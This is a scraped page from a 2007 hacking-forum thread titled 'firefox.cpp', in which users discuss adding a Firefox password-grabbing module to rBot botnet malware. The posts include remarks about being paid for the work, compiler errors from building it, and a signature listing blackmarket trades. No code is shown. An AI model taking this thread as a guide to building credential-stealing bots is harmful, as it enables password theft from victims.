+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73364"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">g7onic</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">superior member</span><br /></div>
+		<img src="images/rank/rank3.gif" alt="superior member" title="superior member" border="0" /><br />
+		
+		<br />
+Age: 17
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 16 Jan 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 489</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Location: 172.0.0.1</span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73364#73364"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Tue May 08, 2007 10:08 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73364"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">umg, money for helping a guy with adding a public &amp; ported firefox code into a rBot <img src="images/smiles/icon_tongue.gif" alt="tongue" border="0" />
+<br />
+
+<br />
+Sculay, you dissapointed me ;)</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />~ Learn from your mistakes, they'll let you grow. ~</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="g7onic is offline" title="g7onic is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=7195"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=7195"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="profile.php?mode=viewprofile&amp;u=7195"><img src="templates/Morpheus/images/lang_english/icon_msn.gif" alt="MSN Messenger" title="MSN Messenger" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73534"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">Sculay</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">elite poster</span><br /></div>
+		<img src="images/rank/rank4.gif" alt="elite poster" title="elite poster" border="0" /><br />
+		
+		<br />
+Age: 18
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 07 Sep 2006</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 627</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Location: East London</span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73534#73534"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Wed May 09, 2007 12:37 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73534"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody"><table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="quote"><tr> 	<td class="quote_user">g7onic wrote:</td></tr><tr>	<td class="quote">umg, money for helping a guy with adding a public &amp; ported firefox code into a rBot <img src="images/smiles/icon_tongue.gif" alt="tongue" border="0" />
+<br />
+
+<br />
+Sculay, you dissapointed me ;)</td>	</tr></table>
+<br />
+moneys money :)</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />ePc &amp; HcK 4ever :)
+<br />
+<span style="text-decoration: underline">Good Business</span>
+<br />
+Succesfull: ShellCapture1, vendor, -ExeL-
+<br />
+Pending: Dej
+<br />
+Failed &amp; wont do business again : Beepo</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="Sculay is offline" title="Sculay is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a><a href="mailto:sculay@gmail.com"><img src="templates/Morpheus/images/lang_english/icon_email.gif" alt="Send e-mail" title="Send e-mail" border="0" /></a><a href="profile.php?mode=viewprofile&amp;u=3053"><img src="templates/Morpheus/images/lang_english/icon_msn.gif" alt="MSN Messenger" title="MSN Messenger" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="73597"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">MaddY</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		
+		<br />
+Age: 23
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 08 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 45</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=73597#73597"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Wed May 09, 2007 4:42 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=73597"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">Hey! Dont go off topic in my thread <img src="images/smiles/violent1.gif" alt="violent1" border="0" /> <img src="images/smiles/icon_evil.gif" alt="Evil or Very Mad" border="0" /></span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="MaddY is offline" title="MaddY is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="75197"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">d4rkf0rg3</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">newbie</span><br /></div>
+		<img src="images/rank/rank0.gif" alt="newbie" title="newbie" border="0" /><br />
+		
+		<br />
+Age: 22
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 09 Feb 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 22</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=75197#75197"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Tue May 15, 2007 7:12 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=75197"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">MaddY nice thread, I would like to know the difference between this code and the pstore one, I would like to add this to phat and everything else...must know c++
+<br />
+
+<br />
+Thanks for the post.</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span><br />_________________<br />Knowlegde is power</span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="d4rkf0rg3 is offline" title="d4rkf0rg3 is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=8447"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=8447"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="76261"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">MaddY</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		
+		<br />
+Age: 23
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 08 Apr 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 45</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=76261#76261"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Sun May 20, 2007 7:51 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=76261"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody"><table width="90%" cellspacing="1" cellpadding="2" border="0" align="center" class="quote"><tr> 	<td class="quote_user">d4rkf0rg3 wrote:</td></tr><tr>	<td class="quote">I would like to know the difference between this code and the pstore one</td>	</tr></table>This grabs Firefox passes and pstore can retrieve IE/Outlook passes..</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="MaddY is offline" title="MaddY is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=10746"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="76933"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">xgnux</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">poster</span><br /></div>
+		<img src="images/rank/rank1.gif" alt="poster" title="poster" border="0" /><br />
+		
+		<br />
+Age: 25
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 04 Mar 2007</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 40</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=76933#76933"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Tue May 22, 2007 1:59 pm</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=76933"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">hmm i try to add to my rbot but i get errors on loaddlls.cpp
+<br />
+
+<br />
+C:\Documents and Settings\Gnu\Desktop\Stripped-RXV8\loaddlls.cpp(172) : error C2146: syntax error : missing ';' before identifier 'fGetUserProfileDirectory'
+<br />
+C:\Documents and Settings\Gnu\Desktop\Stripped-RXV8\loaddlls.cpp(172) : error C2501: 'GUPD' : missing storage-class or type specifiers
+<br />
+C:\Documents and Settings\Gnu\Desktop\Stripped-RXV8\loaddlls.cpp(172) : fatal error C1004: unexpected end of file found
+<br />
+misc.cpp
+<br />
+
+<br />
+and in firefox.cpp
+<br />
+
+<br />
+i get 
+<br />
+C:\Documents and Settings\Gnu\Desktop\Stripped-RXV8\firefox.cpp(83) : error C2065: 'fGetUserProfileDirectory' : undeclared identifier
+<br />
+
+<br />
+anyone can help me out?</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><img src="templates/Morpheus/images/lang_english/icon_offline.png" alt="xgnux is offline" title="xgnux is offline" />&nbsp;<a href="profile.php?mode=viewprofile&amp;u=9358"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=9358"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+<a name="79251"></a>
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_post.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"></td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="post">
+<tr>
+	<td width="150" class="row" align="center" valign="top" style="padding: 2px;" rowspan="2">
+		<div style="padding: 3px;"><span class="name">Giz]v[o</span><br /></div>
+		<div style="padding: 2px;"><span class="postdetails">member</span><br /></div>
+		<img src="images/rank/rank2.gif" alt="member" title="member" border="0" /><br />
+		
+		<br />
+Age: 24
+<br />
+		
+		<table width="100%" cellspacing="5" cellpadding="0">
+			<tr><td align="left"><span class="postdetails">Joined: 21 Dec 2005</span></td></tr>
+			<tr><td align="left"><span class="postdetails">Posts: 165</span></td></tr>
+			<tr><td align="left"><span class="postdetails"></span></td></tr>
+		</table>
+		<img src="./templates/Morpheus/images/spacer.gif" width="150" height="1" border="0" alt="" />
+	</td>
+	<td width="1" class="postborder" rowspan="2"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="100" alt="" /></td>
+	<td width="100%" class="row" align="left" valign="top"><table width="100%" cellspacing="0" cellpadding="0" border="0">
+	<tr>
+		<td width="50%" align="left" style="padding: 3px;"><span class="postdate"><a href="viewtopic.php?p=79251#79251"><img src="templates/Morpheus/images/blue/icon_minipost.gif" width="12" height="9" alt="Post" title="Post" border="0" /></a> Posted: Wed May 30, 2007 2:08 am</span></td>
+		<td width="50%"></td>
+		<td width="23" valign="top" class="posttop" align="left"><img src="./templates/Morpheus/images/posttop_left.gif" width="23" height="9" border="0" alt="" /></td>
+		<td class="posttop" nowrap="nowrap" valign="top"><a href="posting.php?mode=quote&amp;p=79251"><img src="templates/Morpheus/images/lang_english/blue/icon_quote.gif" alt="Reply with quote" title="Reply with quote" border="0" /></a></td>
+	</tr>
+	<tr>
+		<td width="50%" class="postline" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="100" height="1" alt="" /></td>
+		<td colspan="3" height="1"><img src="./templates/Morpheus/images/spacer.gif" width="1" height="1" alt="" /></td>
+	</tr>
+	</table>
+	<div style="padding: 4px;"><span class="postbody">if this is the same as before i dont think this works i could be wrong though</span></div>
+	</td>
+</tr>
+<tr>
+	<td align="left" valign="bottom">
+	<div style="padding: 5px;"><span class="signature"><span class="gensmall"></span></span></div>
+	<table width="100%" height="9" border="0" cellspacing="0" cellpadding="0">
+	<tr>
+		<td class="postbottom" height="9" nowrap="nowrap"><a href="viewonline.php"><img src="templates/Morpheus/images/lang_english/icon_online.png" alt="Giz]v[o is online now" title="Giz]v[o is online now" /></a>&nbsp;<a href="profile.php?mode=viewprofile&amp;u=34"><img src="templates/Morpheus/images/lang_english/icon_profile.gif" alt="View user's profile" title="View user's profile" border="0" /></a><a href="privmsg.php?mode=post&amp;u=34"><img src="templates/Morpheus/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></td>
+		<td width="100%" height="9" align="left"><img src="./templates/Morpheus/images/postbottom_right.gif" width="22" height="9" alt="" /></td>
+	</tr>
+	</table></td>
+</tr>
+</table><table width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="right" width="100%" height="15" valign="top"><a href="#top"><img src="./templates/Morpheus/images/ftr_right.gif" width="60" height="10" alt="" /></a></td></tr></table>
+
+<table width="100%" class="hdr" cellspacing="0" cellpadding="0"><tr><td align="left" width="35"><img src="./templates/Morpheus/images/blue/hdr_left_orange.gif" width="35" height="25" alt="" /></td><td width="100%" align="left" nowrap="nowrap"><a href="viewtopic.php?t=9078&amp;start=0&amp;postdays=0&amp;postorder=asc&amp;highlight=">firefox.cpp</td><td width="120" align="right"><img src="./templates/Morpheus/images/blue/hdr_right_blue.gif" width="120" height="25" alt="" /></td></tr></table><table class="forumline" width="100%" cellspacing="1" cellpadding="3" border="0">
+<tr>
+	<td class="row" align="left" valign="top">
+	<table border="0" cellspacing="0" cellpadding="5" width="100%">
+	<tr>
+<table width="100%" cellspacing="2" border="0" align="center">
+  <tr>
+	<td width="40%" valign="top" nowrap="nowrap" align="left"><span class="gensmall"><a href="viewtopic.php?t=9078&amp;watch=topic&amp;start=0&amp;sid=bfed7ccaa91dbe9db8d1fcca192392e8">Watch this topic for replies</a></span></td>
+	<td align="right" valign="top" nowrap="nowrap"><table cellspacing="0" cellpadding="0" border="0">
+<tr>
+<form method="get" name="jumpbox" action="viewforum.php" onsubmit="if(document.jumpbox.f.value == -1){return false;}">
+	<td nowrap="nowrap"><select name="f" onchange="if(this.options[this.selectedIndex].value != -1){ forms['jumpbox'].submit() }"><option value="-1">Select a forum</option><option value="-1">&nbsp;</option><option value="-1">General</option><option value="-1">----------------</option><option value="9">General Chat</option><option value="7">Introduction</option><option value="21">Graphics - Flash - Design - Templates</option><option value="46">The Fight Club</option><option value="61">Anything Funny - Pictures - Videos - Logs - Websites</option><option value="63">World News- Politics - Religion - Debates - Battles</option><option value="31">Web - Shell - Hosting Reviews - Coupons - Freebies</option><option value="-1">&nbsp;</option><option value="-1">Security</option><option value="-1">----------------</option><option value="3">News</option><option value="43">Blackmarket [BUY/SELL/TRADE]</option><option value="15">General Questions - Discussion</option><option value="6">Downloads - Requests</option><option value="34">Honeypots - Found Nets - Suspicious Files</option><option value="8">Exploits</option><option value="30"selected="selected">Code snippets - Suggestions - Rent a coder</option><option value="26">Proxy - Socks - HTTP - IRC - VNC - Wordlist</option><option value="60">Defacement - Show off</option><option value="19">Cracks - Hacks - Serials</option><option value="56">Phreaking - Cell Phone - Wireless - PDA - VOIP</option><option value="41">Tutorials - Papers - Research</option><option value="-1">&nbsp;</option><option value="-1">General Downloads</option><option value="-1">----------------</option><option value="35">Applications</option><option value="23">Games</option><option value="62">Prank Radio - Pranks - Videos</option><option value="65">Magazines - E-Books - Books - Articles</option><option value="22">Music</option><option value="51">Movies - Videos - Talk</option><option value="55">Torrents - Invites - Trades</option><option 